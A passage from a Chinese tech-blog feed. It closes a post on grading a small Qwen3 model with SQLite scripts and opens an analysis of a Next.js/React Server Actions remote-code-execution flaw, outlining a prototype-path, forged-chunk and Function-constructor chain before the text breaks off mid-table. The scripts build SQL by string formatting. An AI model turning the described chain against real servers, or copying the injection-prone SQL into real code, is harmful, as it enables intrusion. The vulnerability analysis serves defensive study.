<p><strong>Step1</strong> 用商用大模型生成一定数量的问题（这次我就生成 5000 条不同类型的问题吧）</p>
<p><strong>Step2</strong> 使用需要评估的模型对这些问题进行作答，答案需要记录起来与问题一一对应</p>
<p><strong>Step3</strong> 将问题和答案都导出到 Excel 中，使用多个商用大模型对同一份 Excel 进行评分</p>
<p><strong>Step4</strong> 将所有评分记录重新导入数据库并采用平均分的方式获取最终评分</p>
<p>听上去好像没有什么毛病。好，那就立刻开干。</p>
<p>先导出常用的 183 种中药材名称并编写提示词让 Qwen3-MAX 帮我生成 5000 条不同的问题先。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/37e78e566ca14b1fadd544a393bfbff3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgS2lkYeeahOi6uuW5s-Wwj-Wxiw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765509763&amp;x-signature=wqHZeCYAJdvitlWkz4w48QKpKTU%3D" alt="" loading="lazy"/></p>
<p>为了保证问题的质量，这里加上联网搜索让生成出来的问题更加完整。此外，为了提高响应速度最终按每次 1000 条记录分批生成。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/09181f32dbdd4d84856d2e86af9c7de0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgS2lkYeeahOi6uuW5s-Wwj-Wxiw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765509763&amp;x-signature=sJy9uJbAeDmBVQS%2F52n3qqFHPGo%3D" alt="" loading="lazy"/></p>
<h4 data-id="heading-12">3.2 生成答案</h4>
<p>将 5000 条问题导入到 SQLite 后进行数据清洗，排重后 5000 条数据剩下 3370 条。</p>
<pre><code class="hljs language-python" lang="python">    <span class="hljs-keyword">def</span> <span class="hljs-title function_">insert_all_validate_data_to_sqlite</span>(<span class="hljs-params">self</span>):
        
        <span class="hljs-comment"># 遍历目录下的所有 txt 文件</span>
        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> os.listdir(self.dataset_path):
            <span class="hljs-keyword">if</span> <span class="hljs-string">'txt'</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> i:
                <span class="hljs-keyword">continue</span>
            new_path = self.dataset_path + i   
            <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(new_path, <span class="hljs-string">"r"</span>, encoding=<span class="hljs-string">"utf-8"</span>) <span class="hljs-keyword">as</span> f:
                <span class="hljs-keyword">try</span>:
                    loop_index = <span class="hljs-number">0</span>
                    
                    <span class="hljs-comment"># 打开文件遍历每一行，将其全部插入到 SQLite 中</span>
                    <span class="hljs-keyword">for</span> idx,line <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(f):
                        loop_index = idx
                        question = line.split(<span class="hljs-string">". "</span>)[<span class="hljs-number">1</span>]
                        data = {<span class="hljs-string">"question"</span>:question.strip()}
                        self.sql.insert(<span class="hljs-string">"check_dataset_qa"</span>,data)
                <span class="hljs-keyword">except</span>:
                    logger.info(<span class="hljs-string">f"error insert index: <span class="hljs-subst">{loop_index}</span>"</span>)
            logger.info(<span class="hljs-string">f"<span class="hljs-subst">{i}</span> inserted completed..."</span>)
            
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">clean_dulplicate_data</span>(<span class="hljs-params">self</span>):

        <span class="hljs-comment"># 分组查询获取重复问题的最大 id 值</span>
        sql = <span class="hljs-string">"select question,max(id) id from check_dataset_qa group by question having count(1) &gt; 1"</span>
        results = self.sql.fetch_all(sql)
        <span class="hljs-keyword">while</span> <span class="hljs-built_in">len</span>(results) &gt; <span class="hljs-number">0</span>:

            <span class="hljs-comment"># 删除重复数据</span>
            ids = [result[<span class="hljs-number">1</span>] <span class="hljs-keyword">for</span> result <span class="hljs-keyword">in</span> results]
            ids_str = <span class="hljs-string">','</span>.join(<span class="hljs-built_in">map</span>(<span class="hljs-built_in">str</span>, ids))
            del_sql = <span class="hljs-string">f"delete from check_dataset_qa where id in (<span class="hljs-subst">{ids_str}</span>)"</span>
            self.sql.execute(del_sql)
            results = self.sql.fetch_all(sql)
        logger.info(<span class="hljs-string">f"delete dulpicate data completed..."</span>)
</code></pre>
<p>遍历 3370 条记录并将“问题”提交给 0.6B 进行回答推理</p>
<pre><code class="hljs language-python" lang="python">    <span class="hljs-keyword">def</span> <span class="hljs-title function_">generate_answers</span>(<span class="hljs-params">self</span>):

        <span class="hljs-comment"># 初始化 openvino 对象</span>
        ort = OpenvinoRuntime()
        sql = <span class="hljs-string">"SELECT id,question FROM check_dataset_qa WHERE answer IS NULL LIMIT 10"</span>
        results = self.sql.fetch_all(sql)
        batch_count = <span class="hljs-number">0</span>
        <span class="hljs-keyword">while</span> <span class="hljs-built_in">len</span>(results) &gt; <span class="hljs-number">0</span>:

            <span class="hljs-comment"># 分批次遍历获取问题和对应的 id 值</span>
            <span class="hljs-keyword">for</span> <span class="hljs-built_in">id</span>,question <span class="hljs-keyword">in</span> results:
                answer = <span class="hljs-string">""</span>

                <span class="hljs-comment"># 推理流式返回，将所有回答收集起来</span>
                <span class="hljs-keyword">for</span> chunk <span class="hljs-keyword">in</span> ort.transfor_stream_msg(question):
                    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> chunk[<span class="hljs-string">"finished"</span>]:
                        answer += chunk[<span class="hljs-string">"content"</span>]
                    <span class="hljs-keyword">else</span>:
                        <span class="hljs-keyword">if</span> <span class="hljs-string">'full_response'</span> <span class="hljs-keyword">in</span> chunk:
                            final_text = chunk[<span class="hljs-string">'full_response'</span>]
                            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> answer:
                                answer += final_text

                <span class="hljs-comment"># 最后根据 id 进行回答字段的更新</span>
                update_sql = <span class="hljs-string">f"UPDATE check_dataset_qa SET answer = '<span class="hljs-subst">{answer}</span>' WHERE id = <span class="hljs-subst">{<span class="hljs-built_in">id</span>}</span>"</span>
                self.sql.execute(update_sql)
                logger.info(<span class="hljs-string">f"Update id: <span class="hljs-subst">{<span class="hljs-built_in">id</span>}</span> completed..."</span>)
            results = self.sql.fetch_all(sql)
            batch_count += <span class="hljs-number">1</span>
            logger.info(<span class="hljs-string">f"Generate batch <span class="hljs-subst">{batch_count}</span> answers completed..."</span>)
</code></pre>
<h4 data-id="heading-13">3.3 导出 CSV 并用大模型评分（Qwen3-MAX、DeepSeek 和 KIMI 2）</h4>
<p>已回答的记录分批导出成 CSV 文件并提交给商用大模型进行评分，以下以 DeepSeek 界面为例：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a45bd7cc225545058c2bf115d9f3b6c9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgS2lkYeeahOi6uuW5s-Wwj-Wxiw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765509763&amp;x-signature=a9IrEmcbtMck07l4MM9f7O4B4Mc%3D" alt="" loading="lazy"/></p>
<p>如上图所示，提示词中让商用大模型直接返回 id 和评分的 JSON 数据，这样就方便我们进行数据库字段更新了。（这里因为要做到零成本所以没有调用 API 接口，而是通过文档导入导出的方式，在 Web 端获取结果）</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/bf2d234c15bb4af48b526a9f2fbc047a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgS2lkYeeahOi6uuW5s-Wwj-Wxiw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765509763&amp;x-signature=POyYODmyIBZ14u6PpHhIoyqgJcQ%3D" alt="" loading="lazy"/></p>
<p>将 Web 端返回的结果制作成 json 文件，并导入到 SQLite</p>
<pre><code class="hljs language-python" lang="python">    <span class="hljs-keyword">def</span> <span class="hljs-title function_">load_json_and_update_sqlite</span>(<span class="hljs-params">self</span>):
        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> os.listdir(self.score_path):
            new_path = self.score_path + i
            <span class="hljs-built_in">type</span> = i.split(<span class="hljs-string">"."</span>)[<span class="hljs-number">0</span>]  
            json_data = CommonUtil.load_json_file(new_path)
            <span class="hljs-keyword">for</span> json_obj <span class="hljs-keyword">in</span> json_data:
                <span class="hljs-built_in">id</span> = json_obj[<span class="hljs-string">'id'</span>]
                score = json_obj[<span class="hljs-string">'score'</span>]
                update_sql = <span class="hljs-string">f"update check_dataset_qa set <span class="hljs-subst">{<span class="hljs-built_in">type</span>}</span>_score = <span class="hljs-subst">{score}</span> where id = <span class="hljs-subst">{<span class="hljs-built_in">id</span>}</span>"</span>
                self.sql.execute(update_sql)
                logger.info(<span class="hljs-string">f"Update id: <span class="hljs-subst">{<span class="hljs-built_in">id</span>}</span> completed..."</span>)
                
            logger.info(<span class="hljs-string">f"<span class="hljs-subst">{<span class="hljs-built_in">type</span>}</span> inserted completed..."</span>)
</code></pre>
<h4 data-id="heading-14">3.4 汇总评分（全 SQL 操作）</h4>
<p>待全部分数导入完毕后，就可以计算每条记录的大模型平均分了，有了每条记录的平均分就可以计算整体回答质量的平均分。如下图所示：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a75576ba482c4aeb9d0531348ddf023a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgS2lkYeeahOi6uuW5s-Wwj-Wxiw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765509763&amp;x-signature=GvPSHnRScy%2F0SjAbhH12VUGVhIY%3D" alt="" loading="lazy"/></p>
<p>最终，整个模型评分为 6.607。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d4bd046781b742bf8e78a28474299577~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgS2lkYeeahOi6uuW5s-Wwj-Wxiw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765509763&amp;x-signature=7DAECnvuxRV5B6f63LfyZNv%2BXb4%3D" alt="" loading="lazy"/></p>
<p>整体质量在合格线之上，评分等级数据统计如下：</p>





























<table><thead><tr><th>平均分</th><th>占比</th></tr></thead><tbody><tr><td>&lt;6</td><td>2.67%</td></tr><tr><td>&gt;=6  and  &lt;7</td><td>36.87%</td></tr><tr><td>&gt;=7  and  &lt;8</td><td>57.32%</td></tr><tr><td>&gt;=8  and  &lt;9</td><td>3.12%</td></tr><tr><td>&gt;=9</td><td>0%</td></tr></tbody></table>
<p>通过表格可知，推理返回结果基本能贴题但不够全面，侧面说明训练数据“面”还不够广。并且经抽查发现推理结果含有大量“杂音”，这说明还需要在训练精度和提示词上下点功夫才行。</p>
<p>总的来说就是资源（数据、硬件、时间等）还不够，就当前结果而言个人觉得已经在能力范围内做到最好了。</p>
<p>直到模型使用 CPU 方案落地的那一刻为止目前还没有用过一分钱（严格坚守自己的原则），后续只要继续优化调整即可。</p>
<p>坦白说，虽然最终未能实现思考链推理有点遗憾，但性能和质量的确是上来了（相比上一年的 Qwen1.5 版本）。每次跨越一小步就可以了，毕竟个人力量怎能与企业集团相比呢。</p>
<p>如果没有办法做多轮精准应答，那么可以改变策略，做边缘推理也行。就像我上面说的那样，可以考虑将这个模型放入 APP 里面。用户可以在本地算力下做一些简短的推理，之后再根据业务需求决定是否发送到云端进行深层推理。那这就能做很多东西了...</p>
<p>好了，以上就是本章分享的全部内容了，代码均发布到 brain-mix 项目中，欢迎各位的指导。</p>
<p>gitee：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgitee.com%2Fyzh0623%2Fbrain-mix" target="_blank" title="https://gitee.com/yzh0623/brain-mix" ref="nofollow noopener noreferrer">gitee.com/yzh0623/bra…</a></p>
<p>github：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fyzh0623%2Fbrain-mix" target="_blank" title="https://github.com/yzh0623/brain-mix" ref="nofollow noopener noreferrer">github.com/yzh0623/bra…</a></p>
<p>（未完待续...）</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[深入探究 React 史上最大安全漏洞]]></title>    <link>https://juejin.cn/post/7579892222609293347</link>    <guid>https://juejin.cn/post/7579892222609293347</guid>    <pubDate>2025-12-05T03:44:12.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7579892222609293347" data-draft-id="7579887768227774498" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="深入探究 React 史上最大安全漏洞"/> <meta itemprop="keywords" content="前端,React.js,Next.js"/> <meta itemprop="datePublished" content="2025-12-05T03:44:12.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="锈儿海老师"/> <meta itemprop="url" content="https://juejin.cn/user/1814619113927805"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            深入探究 React 史上最大安全漏洞
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1814619113927805/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    锈儿海老师
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-05T03:44:12.000Z" title="Fri Dec 05 2025 03:44:12 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    3
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读8分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">Next.js Server Actions RCE 漏洞分析</h2>
<h3 data-id="heading-1">摘要</h3>
<p>本文档深入分析了 React Flight 协议（React Server Actions 的底层协议）中的一个远程代码执行 (RCE) 漏洞。该利用链串联了<strong>三个关键漏洞</strong>：</p>
<ol>
<li>引用解析中的<strong>未过滤路径遍历</strong>（可访问 <code>__proto__</code> 和 <code>constructor</code>）。</li>
<li><strong>伪造 Chunk 注入</strong> —— 将精心构造的对象伪装成内部 Chunk 对象处理。</li>
<li><strong>Function 构造函数注入</strong> —— 将 <code>_formData.get</code> 方法替换为 <code>Function</code> 构造函数。</li>
</ol>
<hr/>
<h3 data-id="heading-2">目录</h3>
<ol>
<li><a href="#react-server-actions-%E7%AE%80%E4%BB%8B" title="#react-server-actions-%E7%AE%80%E4%BB%8B">React Server Actions 简介</a></li>
<li><a href="#react-flight-%E5%8D%8F%E8%AE%AE" title="#react-flight-%E5%8D%8F%E8%AE%AE">React Flight 协议</a></li>
<li><a href="#payload-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B7%B1%E5%BA%A6%E8%A7%A3%E6%9E%90" title="#payload-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B7%B1%E5%BA%A6%E8%A7%A3%E6%9E%90">Payload 反序列化深度解析</a></li>
<li><a href="#payload-%E8%AF%A6%E6%83%85" title="#payload-%E8%AF%A6%E6%83%85">Payload 详情</a></li>
<li><a href="#%E8%AF%A6%E7%BB%86%E4%BB%A3%E7%A0%81%E8%B7%AF%E5%BE%84%E5%88%86%E6%9E%90" title="#%E8%AF%A6%E7%BB%86%E4%BB%A3%E7%A0%81%E8%B7%AF%E5%BE%84%E5%88%86%E6%9E%90">详细代码路径分析</a></li>
<li><a href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%B5%81%E7%A8%8B%E5%8F%AF%E8%A7%86%E5%8C%96" title="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%B5%81%E7%A8%8B%E5%8F%AF%E8%A7%86%E5%8C%96">漏洞利用流程可视化</a></li>
<li><a href="#%E6%A0%B9%E5%9B%A0%E6%80%BB%E7%BB%93" title="#%E6%A0%B9%E5%9B%A0%E6%80%BB%E7%BB%93">根因总结</a></li>
</ol>
<hr/>
<h3 data-id="heading-3">React Server Actions 简介</h3>
<h4 data-id="heading-4">什么是 Server Actions？</h4>
<p>React Server Actions 是 React 18 引入并完全集成在 Next.js 13+ App Router 中的一项功能。它允许开发者定义<strong>服务端函数</strong>，并在客户端组件中直接调用，而无需显式创建 API 路由。</p>
<pre><code class="hljs language-jsx" lang="jsx"><span class="hljs-comment">// app/actions.js</span>
<span class="hljs-string">'use server'</span>

<span class="hljs-keyword">export</span> <span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">submitForm</span>(<span class="hljs-params">formData</span>) {
  <span class="hljs-keyword">const</span> name = formData.<span class="hljs-title function_">get</span>(<span class="hljs-string">'name'</span>)
  <span class="hljs-keyword">await</span> db.<span class="hljs-property">users</span>.<span class="hljs-title function_">create</span>({ name })
  <span class="hljs-keyword">return</span> { <span class="hljs-attr">success</span>: <span class="hljs-literal">true</span> }
}
</code></pre>
<pre><code class="hljs language-jsx" lang="jsx"><span class="hljs-comment">// app/page.jsx</span>
<span class="hljs-keyword">import</span> { submitForm } <span class="hljs-keyword">from</span> <span class="hljs-string">'./actions'</span>

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">Page</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">{submitForm}</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"name"</span> /&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"submit"</span>&gt;</span>Submit<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span></span>
  )
}
</code></pre>
<h4 data-id="heading-5">Server Actions 的工作原理</h4>
<p>当 Server Action 被调用时：</p>
<pre><code class="hljs language-vbscript" lang="vbscript">┌─────────────────────────────────────────────────────────────────────────────┐
│                        <span class="hljs-built_in">SERVER</span> ACTION 流程                                   │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│   客户端 (Client)                  网络 (Network)              服务端 (<span class="hljs-built_in">Server</span>) │
│   ──────                           ───────                      ──────      │
│                                                                             │
│   <span class="hljs-number">1.</span> 用户提交表单                                                             │
│          │                                                                  │
│          ▼                                                                  │
│   <span class="hljs-number">2.</span> React 使用 Flight                                                       │
│      协议序列化参数               POST /                                      │
│                                   multipart/form-data       <span class="hljs-number">3.</span> <span class="hljs-keyword">Next</span>.js 接收  │
│   ─────────────────────────────►  <span class="hljs-keyword">Next</span>-Action: &lt;id&gt;              请求        │
│                                                                  │          │
│                                                                  ▼          │
│                                                           <span class="hljs-number">4.</span> 使用 Flight     │
│                                                              反序列化参数     │
│                                                                  │          │
│                                                                  ▼          │
│                                                           <span class="hljs-number">5.</span> 执行            │
│   <span class="hljs-number">7.</span> React 根据结果     ◄─────────────────────────────       <span class="hljs-built_in">Server</span> Action   │
│      更新 UI                  Flight 编码的响应                   │           │
│                                                                  ▼          │
│                                                           <span class="hljs-number">6.</span> 序列化返回值     │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
</code></pre>
<h4 data-id="heading-6"><code>Next-Action</code> 标头</h4>
<p>当调用 Server Action 时，Next.js 会发送一个带有特殊标头的 POST 请求：</p>
<pre><code class="hljs language-http" lang="http">POST /page HTTP/1.1
Host: example.com
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary...
Next-Action: 1234567890abcdef        ← Server Action 标识符
Next-Router-State-Tree: ...          ← 客户端路由状态
</code></pre>
<p><code>Next-Action</code> 标头告知服务器执行哪个已注册的函数。请求体包含序列化后的参数。</p>
<hr/>
<h3 data-id="heading-7">React Flight 协议</h3>
<h4 data-id="heading-8">概述</h4>
<p><strong>Flight 协议</strong> 是 React 的自定义序列化格式，用于在服务端和客户端之间传输 React 组件树和数据。它旨在处理：</p>
<ul>
<li>React 元素和组件</li>
<li>Promise 和异步数据</li>
<li>循环引用</li>
<li>二进制数据 (Blobs, TypedArrays)</li>
<li>服务端引用 (在服务端运行的函数)</li>
</ul>
<h4 data-id="heading-9">Flight 协议架构</h4>
<pre><code class="hljs language-scss" lang="scss">┌─────────────────────────────────────────────────────────────────────────────┐
│                         FLIGHT 协议层级                                      │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│   ┌─────────────────────────────────────────────────────────────────────┐   │
│   │                     应用层 (Application Layer)                       │   │
│   │   Server Actions, React Server Components, 数据获取                  │   │
│   └─────────────────────────────────────────────────────────────────────┘   │
│                                    │                                        │
│                                    ▼                                        │
│   ┌─────────────────────────────────────────────────────────────────────┐   │
│   │                    序列化层 (Serialization Layer)                    │   │
│   │                                                                     │   │
│   │   ReactFlightServer<span class="hljs-selector-class">.js</span> (服务端 → 客户端 编码)                         │   │
│   │   ReactFlightClient<span class="hljs-selector-class">.js</span> (客户端 → 服务端 解码)                         │   │
│   │   ReactFlightReplyServer<span class="hljs-selector-class">.js</span> (客户端 → 服务端 回复解码) ← 漏洞所在       │   │
│   │   ReactFlightReplyClient<span class="hljs-selector-class">.js</span> (服务端 → 客户端 回复编码)                 │   │
│   │                                                                     │   │
│   └─────────────────────────────────────────────────────────────────────┘   │
│                                    │                                        │
│                                    ▼                                        │
│   ┌─────────────────────────────────────────────────────────────────────┐   │
│   │                     传输层 (Transport Layer)                         │   │
│   │   multipart/<span class="hljs-selector-tag">form</span>-data, ReadableStream, <span class="hljs-built_in">fetch</span>()                      │   │
│   └─────────────────────────────────────────────────────────────────────┘   │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
</code></pre>
<h4 data-id="heading-10">Flight 引用类型</h4>
<p>Flight 协议使用 <strong><code>$</code> 前缀的字符串</strong> 来编码纯 JSON 无法表示的特殊值：</p>











































































































<table><thead><tr><th>前缀</th><th>类型</th><th>示例</th><th>描述</th></tr></thead><tbody><tr><td><code>$$</code></td><td>转义 <code>$</code></td><td><code>"$$hello"</code> → <code>"$hello"</code></td><td>以 <code>$</code> 开头的字面量字符串</td></tr><tr><td><code>$@</code></td><td>Promise/Chunk</td><td><code>"$@0"</code></td><td>引用 Chunk ID 0</td></tr><tr><td><code>$F</code></td><td>服务端引用</td><td><code>"$F0"</code></td><td>服务端函数引用</td></tr><tr><td><code>$T</code></td><td>临时引用</td><td><code>"$T"</code></td><td>不透明的临时引用</td></tr><tr><td><code>$Q</code></td><td>Map</td><td><code>"$Q0"</code></td><td>位于 Chunk 0 的 Map 对象</td></tr><tr><td><code>$W</code></td><td>Set</td><td><code>"$W0"</code></td><td>位于 Chunk 0 的 Set 对象</td></tr><tr><td><code>$K</code></td><td>FormData</td><td><code>"$K0"</code></td><td>位于 Chunk 0 的 FormData</td></tr><tr><td><code>$B</code></td><td>Blob</td><td><code>"$B0"</code></td><td>位于 Chunk 0 的 Blob</td></tr><tr><td><code>$n</code></td><td>BigInt</td><td><code>"$n123"</code></td><td>BigInt 值</td></tr><tr><td><code>$D</code></td><td>Date</td><td><code>"$D2024-01-01"</code></td><td>Date 对象</td></tr><tr><td><code>$N</code></td><td>NaN</td><td><code>"$N"</code></td><td>NaN 值</td></tr><tr><td><code>$I</code></td><td>Infinity</td><td><code>"$I"</code></td><td>无穷大</td></tr><tr><td><code>$-</code></td><td>-Infinity/-0</td><td><code>"$-I"</code> 或 <code>"$-0"</code></td><td>负无穷或负零</td></tr><tr><td><code>$u</code></td><td>undefined</td><td><code>"$u"</code></td><td>undefined 值</td></tr><tr><td><code>$R</code></td><td>ReadableStream</td><td><code>"$R0"</code></td><td>ReadableStream</td></tr><tr><td><code>$0-9a-f</code></td><td>Chunk 引用</td><td><code>"$1"</code>, <code>"$a"</code></td><td>通过十六进制 